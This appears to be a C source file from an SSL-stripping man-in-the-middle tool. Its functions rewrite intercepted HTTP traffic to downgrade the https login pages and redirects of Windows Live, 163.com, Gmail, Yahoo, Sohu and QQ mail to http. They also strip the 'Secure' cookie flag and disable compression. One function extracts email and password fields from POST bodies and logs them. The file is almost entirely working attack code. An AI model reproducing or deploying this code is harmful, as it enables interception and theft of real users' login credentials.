
#include <pcre.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "dataProcessor.h"
#include "processorDataStr.h"
//#include "storeEngine.h"
#include "Analyzer_log.h"

#ifndef PRO_MOD_AP_SET
#define PRO_MOD_AP_SET 0x00400000
#endif

static int isPostHeader(char* data);
static int isReplyHeader(char* data);
static int isGetHeader(char* data);
static int isTextDat(char* data);
static int isJavascriptDat(char* data);
static int isGetImg(char* data);



//Description: replace "POST http://" with "POST https://"
//Parameter:  dat: data received from client
//Note :  is not usefull in fact
int dataProcessFuncPubA(int mode,void* dat){
//printf("get into function A\n");
	char* data=dat;
	if(strlen(data)<20)
		return mode;
	if(!isPostHeader(data))
		return mode;
	if(memcmp(data,"POST http://",10))	
		return mode;
	int len=strlen(data);
	while(len>0){
		data[len]=data[len-1];
		len--;
	}
	memcpy(data,"POST https:",10);
//printf("data replaced and will get outof funcA\n");
	return mode|DAT_LEN_CHAN;
}


//Description: set Accept-Encoding equals to none
//Parameter: data: data received from client
int dataProcessFuncPubB(int mode,void* data){
//printf("get into function B\n");
	if(!(isGetHeader(data)||isPostHeader(data)))
		return mode;
	char* matchDat=data;
	char* pattern="Accept-Encoding: ";
	char* patternB="";
	char* addr=strstr(matchDat,pattern);
	if(addr==NULL)
		return mode;
	int i=(int)addr-(int)matchDat;
	int len=strlen(matchDat);
	while(i<len && matchDat[i]!=':')
		i++;
	i++;
	if(i>=len)
		return mode;
	int start=i;
 
	while(i<len && matchDat[i]!='\r'){
		matchDat[i]=0x20;
		i++;
	}
 
	if(i-start>=5){
		start++;
		matchDat[start]='n';
		matchDat[start+1]='o';
		matchDat[start+2]='n';
		matchDat[start+3]='e';
	}
	return mode|DAT_CON_CHAN;
}




// replace redirection
//Function Name: dataProcessFuncC
//Description: replace "Location: https://login.live.com/login.srf" with
//					"Location: http://login.live.com/login.srf"
//Parameter: data: data received from server
int dataProcessFuncMsnC(int mode,void* data){
	if(!isReplyHeader(data))
		return mode;	
//printf("get into function C\n");
	char* matchDat=data;
	 char* pattern="Location: https://login.live.com/login.srf";
	char* patternB="Location:  http://login.live.com/login.srf";
	char* addr=NULL;
	addr=strstr(matchDat,pattern);
	if(addr==NULL){
		//printf("find pattern fail\n");
		return mode;
	}
	memcpy(addr,patternB,strlen(patternB));
	return mode|DAT_CON_CHAN;
//printf("data len not changed\n");
	return mode;
}


// replace https://login.live.com/ss***
//Function Name: dataProcessFuncD
//Description: replace "https://login.live.com/ppsecure/post.srf" with
//					"http://login.live.com/ppsecure/post.srf"
//Parameter: data: data received from server
int dataProcessFuncMsnD(int mode,void* data){
//printf("get into funcD\n");
		if(!isReplyHeader(data)|| !isTextDat(data))
			return mode;
//printf("mode: %d\n",mode&PRO_MOD_AP_SET);
//printf("begin find https://login.live.com/ppsecure\n");
		char* matchDat=data;
		 char* pattern="https://login.live.com/ppsecure/post.srf";
		char* patternB=" http://login.live.com/ppsecure/post.srf";
		
		char* addr=NULL;
		while((addr=strstr(data,pattern))){
				memcpy(addr,patternB,strlen(patternB));
//printf(":::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n");
//printf(" find https://login.live.com/ppsecure/post");
//printf(":::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n");

		}

//printf(":::Login //page:::::::::::::::::::::::::::::::::::::::::::::::::\n");
//printf("%s\n",data);

//printf("::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n");

		if(addr){
			return mode|DAT_CON_CHAN;
		}
		return mode;

}


//Function Name: dataProcessFuncE
//
//Description: replace "https://reg.163.com/logins.jsp" with
//					"http://reg163.com/login.jsp"
//					replace "https://ssl.mail.163.com/logins.jsp" with
//					"http://ssl.mail.163.com/login.jsp"
int dataProcessFunc163E(int mode,void* dat){
	if(!isReplyHeader(dat)|| !(isJavascriptDat(dat)||isTextDat(dat)))
		return mode;
	 char* pattern="https://reg.163.com/logins.jsp";
	char* patternB="  http://reg.163.com/login.jsp";
	char* addr=NULL;
	int len=strlen(pattern);
	while(addr=strstr(dat,pattern)){
		memcpy(addr,patternB,len);
	}
	char* patternC="https://ssl.mail.163.com/logins.jsp";
	char* patternD="  http://ssl.mail.163.com/login.jsp";
	len=strlen(patternD);
	while(addr=strstr(dat,patternC)){
		memcpy(addr,patternD,len);
	}
	char* patternE="https://ssl.mail.yeah.net/entry/cgi/ntesdoor";
	char* patternF=" http://ssl.mail.yeah.net/entry/cgi/ntesdoor";
	len=strlen(patternF);
	while(addr=strstr(dat,patternE)){
		memcpy(addr,patternF,len);
	}
	return mode|DAT_CON_CHAN;
}

//Function Name: dataProcessFuncF
//Description: get the account information of user
//Parameter: dat: data received from client
//Note: deprecated
int dataProcessFuncAccount(int mode,void* dat){
	ProcessorPara* para=(ProcessorPara*)dat;
	char* data=(char*)para->pub;
	char mail[100];
	char pass[100];
	memset(mail,0,100);
	memset(pass,0,100);
	char* patternA="login=";
	char* patternB="passwd=";
	char* addr=strstr(data,patternA);
	if(!addr){
		patternA="Email=";
		patternB="Passwd=";
		addr=strstr(data,patternA);	
	}
	if(!addr)
		return -1;
	int index=(int)addr-(int)data;
	index+=strlen(patternA);
	int len=strlen(data);
	int i=0;
	while(i<100&&index<len && data[index]!='&'){
		mail[i]=data[index];
		i++;
		index++;
	}
	addr=strstr(data,patternB);
	if(!addr)
		return -1;
	index=(int)addr-(int)data;
	index+=strlen(patternB);
	i=0;
	while(i<100&& index<len&&data[index]!='&'){
		pass[i]=data[index];
		i++;
		index++;
	}
LOG_INFO("mail:%s pass:%s\n",mail,pass);
	//storeAccount(mail,pass,para->pri);
	return 1;
}

//Function name: dataProcessFuncG
//
//Description: replace "https://mail.google.com/" with 	
//					"http://mail.google.com"
//					replace "https://www.google.com/" with
//					"http://www.google.com"/
//Parameter: dat: data received from server
int dataProcessFuncGG(int mode,void* dat){
	char* data=dat;
	if(!isReplyHeader(data))
		return mode;
	if(!(isJavascriptDat(dat)||isTextDat(dat)))
		return mode;
	char* addr=NULL;
	 char* pattern="\"https://mail.google.com/";
	char* patternB=" \"http:";
// TMP
	while(addr=strstr(data,pattern)){
		memcpy(addr,patternB,strlen(patternB));
		data=addr+strlen(pattern);
	}
	char* patternE="https://mail.google.com/";
	char* patternF=" http://";
	data=dat;
	while(addr=strstr(data,patternE)){
		memcpy(addr,patternF,strlen(patternF));
		data=addr+strlen(patternE);
	}

	data=dat;
	char* patternC="https://www.google.com/";
	char* patternD=" http:";
	while(addr=strstr(data,patternC)){
		memcpy(addr,patternD,strlen(patternD));
		data=addr+strlen(patternC);
	}
	return mode|DAT_CON_CHAN;
}

//Function name: dataProcessFuncH
//
//Description: replace "Location: https:" with "Location:  http"
//Parameter: data :data received from server 
int dataProcessFuncGH(int mode,void* dat){
	if(!isReplyHeader(dat))
		return mode;
	char* data=dat;
	char* addr=NULL;
	 //char* pattern="Location: https://www.google.com/accounts/";
	char* pattern="Location: https://www.google.com/";//20110702
	char* patternB="Location:  http";
	if(addr=strstr(data,pattern)){
		memcpy(addr,patternB,strlen(patternB));
		return mode|DAT_CON_CHAN;
	}
	return mode;
}

//Function name: dataProcessFuncI
//
//Description: replace "Referer: http://www.google.com" with
//					 "Referer:https//www.google.com" in post package
//Parameter: data :data received from client 
int dataProcessFuncGI(int mode,void* dat){
	if(!isPostHeader(dat))
		return mode;
//printf("---------get into function I --------------\n");
	char* data=dat;
	char*  pattern="Referer: http://www.google.com";
	char* patternB="Referer:https://www.google.com";
	char* addr=NULL;
	if(addr=strstr(data,pattern)){
		memcpy(addr,patternB,strlen(patternB));
//		printf("replace referer--------");
		return mode|DAT_CON_CHAN;
	}
//printf("---------get outof function I-------\n");
	return mode;
}

//Function name: dataProcessFuncJ
//
//Description: replace "http://www" with "https://ssl"
//Parameter: data :data received from server 
int dataProcessFuncGJ(int mode,void* dat){
	if(!isReplyHeader(dat))
		return mode;
	char* data=dat;
	char* addr=NULL;
	char*  pattern="\'https://ssl\' : \'http://www\'";
	char* patternB="\'https://ssl\' :\'https://ssl\'";
	if(addr=strstr(data,pattern)){
		memcpy(addr,patternB,strlen(patternB));
		return mode|DAT_CON_CHAN;
	}
	return mode;
}

//Function name: dataProcessFuncM
//
//Description: delete the attribute "Secure"
//Parameter: data :data received from server 
int dataProcessFuncGM(int mode,void* dat){
	char* data=dat;
	if(!isReplyHeader(data))
		return mode;
	if(!isTextDat(data))
		return mode;
	char* addr=NULL;
	char* addrB=NULL;
	char* start=data;
	while(addr=strstr(start,";Secure")){
		memcpy(addr,"       ",7);
		start=addr+8;
	}
	start=data;
	while(addr=strstr(start,"; Secure")){
		memcpy(addr,"        ",8);
		start=addr+9;
	}	
	return mode|DAT_CON_CHAN;
}

//Function name: dataProcessFuncN
//
//Description: replace "Referer: http://www.google.com" with 			 
//					"Referer:https://www.google.com" in get-request package
//Parameter: data :data received from client 
int dataProcessFuncGN(int mode,void* dat){
	if(!isGetHeader(dat))
		return mode;
	char* data=dat;
	char*  pattern="Referer: http://www.google.com";
	char* patternB="Referer:https://www.google.com";
	char* addr=NULL;
	if(addr=strstr(data,pattern)){
		memcpy(addr,patternB,strlen(patternB));
		return mode|DAT_CON_CHAN;
	}
	return mode;
}

//Function name: dataProcessFuncO
//
//Description: replace "continue=%20http" with "continue=https"
//Parameter: data :data received from client 
int dataProcessFuncGO(int mode,void* dat){
	if(!isGetHeader(dat))
		return mode;
	char* data=dat;
	char*  pattern="continue=%20http://www.google.com/accounts";
	char* patternB="continue=https:";
	char* addr=NULL;
	if(addr=strstr(data,pattern)){
		int iPBLen=strlen(patternB);
		memcpy(addr,patternB,iPBLen);
		int ilen=strlen(data);
		int iindexDes=(addr-data)+iPBLen;
		int iindexSrc=iindexDes+2;
		while(iindexSrc<ilen){
			data[iindexDes]=data[iindexSrc];
			iindexDes++;
			iindexSrc++;
		}
		return mode|DAT_CON_CHAN;
	}
	return mode;
}

//Function name: dataProcessFuncP
//
//Description: replace "continue=+http" with "continue=https"
//Parameter: data :data received from client 
int dataProcessFuncGP(int mode,void* dat){
	if(!isPostHeader(dat))
		return mode;
	char* data=dat;
	char*  pattern="continue=+http";
	char* patternB="continue=https";
	char* addr=NULL;
	if(addr=strstr(data,pattern)){
		memcpy(addr,patternB,strlen(patternB));
		return mode|DAT_CON_CHAN;
	}
	return mode;
}

//Function name: dataProcessFuncQ
//
//Description: replace "https://login.live.com" with 			 
//					"http://login.live.com" in get-response package
//Parameter: data :data received from server 
int dataProcessFuncMsnQ(int mode,void* dat){
	if(!isReplyHeader(dat)|| !isTextDat(dat))
		return mode;
	char* data=dat;
	char*  pattern="https://login.live.com";
	char* patternB=" http://login.live.com";
	char* addr=NULL;
	char* start=data;
	while(addr=strstr(start,pattern)){
		memcpy(addr,patternB,strlen(patternB));
	}
	//if(start!=data)
	return mode|DAT_CON_CHAN;
	return mode;
}

//Function name: dataProcessFuncR
//Description: replace "https://mail.google.com/mail/?shva=1" with
//								"http://mail.google.com/mail/?ui=html"
//Parameter: 
int dataProcessFuncGR(int mode,void* dat){
	if(!isReplyHeader(dat) || !isTextDat(dat))
		return mode;
	char* data=dat;
	char*   pattern="Location: https://mail.google.com/mail/?shva=1";
	char*  patternB="Location:  http://mail.google.com/mail/?shva=1";
	char*  patternC="Location: http://mail.google.com/mail/?ui=html";
	
	char* patternT="Location:\\s{1,2}((https:)|(http:))//mail.google.com/mail/\\?(hl=\\w*-?\\w*&)?shva=1";
	static pcre* id2=NULL; 
	int offset;
	const char* err;
	char* addr=strstr(data,pattern);
	if(!addr)
		addr=strstr(data,patternB);
	if(addr){
		memcpy(addr,patternC,strlen(patternC));
		return mode|DAT_CON_CHAN;
	}
	else{
		if(id2==NULL)
			id2=pcre_compile(patternT,0,&err,&offset,0);
		if(id2){
			data=dat;
			int vect[12];
			int i=pcre_exec(id2,0,data,strlen(data),0,0,vect,12);
			if(i>=0){
				int i=vect[0];
				int e=vect[1];
				if(data[i+14]=='s')
					i+=14;
				else
					i+=10;
				{
					while(i<e-7){
						data[i]=data[i+1];
						i++;
					}
					memcpy(data+i,"ui=html",7);
				}
			}
		}
	}
	
	
	
	return mode;
}


int dataProcessFuncYAHOO(int mode, void *dat)
{
	if(!isReplyHeader(dat)|| !(isJavascriptDat(dat)||isTextDat(dat)))
		return mode;
		
	char* pattern ="https://edit.bjs.yahoo.com/";
	char* patternB=" http://edit.bjs.yahoo.com/";
	char* addr=NULL;
	int len=strlen(pattern);
	while(addr=strstr(dat,pattern)){
		memcpy(addr,patternB,len);
	}
	
	return mode|DAT_CON_CHAN;
}

int dataProcessFuncYAHOO_B(int mode, void *dat)
{
	if(!isReplyHeader(dat)|| !(isJavascriptDat(dat)||isTextDat(dat)))
		return mode;
		
	char* pattern ="https://login.yahoo.com/";
	char* patternB=" http://login.yahoo.com/";
	char* addr=NULL;
	int len=strlen(pattern);
	while(addr=strstr(dat,pattern)){
		memcpy(addr,patternB,len);
	}
	
	return mode|DAT_CON_CHAN;
}

int dataProcessFuncYAHOO_C(int mode, void *dat)
{
	if(!isReplyHeader(dat)|| !(isJavascriptDat(dat)||isTextDat(dat)))
		return mode;
	char* addr=NULL;
	char* addrB=NULL;
	
	char* start=dat;
	while(addr=strstr(start,";secure")){
		memcpy(addr,"       ",7);
		start=addr+8;
	}
	start=dat;
	while(addr=strstr(start,"; secure")){
		memcpy(addr,"        ",8);
		start=addr+9;
	}	
	return mode|DAT_CON_CHAN;
}


int dataProcessFuncSOHU(int mode,void* dat)
{
	char* data=dat;
	if(!isReplyHeader(data))
		return mode;
	if(!(isJavascriptDat(dat)||isTextDat(dat)))
		return mode;
	
	char* addr=NULL;
	char* pattern="https://mail.sohu.com";
	char* patternB=" http:";
	
	while(addr=strstr(data,pattern))
	{
		memcpy(addr,patternB,strlen(patternB));
	}
	
	data=dat;
	char* patternC="https://passport.sohu.com";
	char* patternD=" http:";
	while(addr=strstr(data,patternC))
	{
		memcpy(addr,patternD,strlen(patternD));
	}
	
	
	return mode|DAT_CON_CHAN;
}


int dataProcessFuncQQ(int mode, void *dat)
{
	if(!isReplyHeader(dat)|| !(isJavascriptDat(dat)||isTextDat(dat)))
		return mode;
		
	char* pattern ="https://mail.qq.com";
	char* patternB=" http://mail.qq.com";
	char* addr=NULL;
	int len=strlen(pattern);
	while(addr=strstr(dat,pattern)){
		memcpy(addr,patternB,len);
	}
	
	return mode|DAT_CON_CHAN;
}

int dataProcessFuncQQ_B(int mode, void *dat)
{
	if(!isReplyHeader(dat)|| !(isJavascriptDat(dat)||isTextDat(dat)))
		return mode;
		
	char* pattern ="\"ssl_edition=;";
	char* patternB="\"    edition=;";
	char* addr=NULL;
	int len=strlen(pattern);
	while(addr=strstr(dat,pattern)){
		memcpy(addr,patternB,len);
	}
	
	return mode|DAT_CON_CHAN;
}















//Function name: isGetHeader
//
//Description: test if the package is a get package
//Parameter: data :data received from client 
static int isGetHeader(char* data){
		char* matchDat=data;
		char* pattern="GET /";
		if(strlen(matchDat)>20&&memcmp(pattern,data,5)==0)
			return 1;
		return 0;
}

//Function name: isReplyHeader
//
//Description: test if the package is a reply package
//Parameter: data :data received from server 
static int isReplyHeader(char* data){
	if(strlen(data)>5&&memcmp("HTTP/",data,5)==0){
		int i=5;
		int len=strlen(data);
		while(i<len&&data[i]!=' ')
			i++;
		char buf[4];
		memset(buf,0,4);
		i++;
		int j=0;
		while(j<3&&i<len&&data[i]!=' '){
			buf[j]=data[i];
			j++;
			i++;
		}
		int status=atoi(buf);
		if(status==302)
		return 1;
		return 1;   
	}	
	return 0;
}

//Function name: isPostHeader
//
//Description: test if the package is a post package
//Parameter: data :data received from client 
static int isPostHeader(char* data){
	if(!(strlen(data)>10 && memcmp("POST ",data,5)==0))
		return 0;
	return 1;

}

//Function name: isTextHeader
//
//Description: test if the package is a plain-text package
//Parameter: data :data received from server 
static int isTextDat(char* data){
	char* addr=strstr(data,"Content-Type: text/html");
	if(addr!=NULL){
	return 1;
	}
	return 0;
}

//Function name: isJavaScriptDat
//
//Description: test if the package is a javascript-text package
//Parameter: data :data received from server 
static int isJavascriptDat(char* data){
	char* addr=strstr(data,"Content-Type: application/x-javascript");
	if(addr)
		return 1;
	else
		return 0;
}

//Function name: isGetImg
//
//Description: test if the package is a request of image
//Parameter: data :data received from client 
static int isGetImg(char* data){
	char* addr=strstr(data,".gif HTTP/");
	if(addr && (addr-data)<200)
		return 1;
	addr=strstr(data,".png HTTP/");
	if(addr && (addr-data)<200)
		return 1;
	return 0;
}


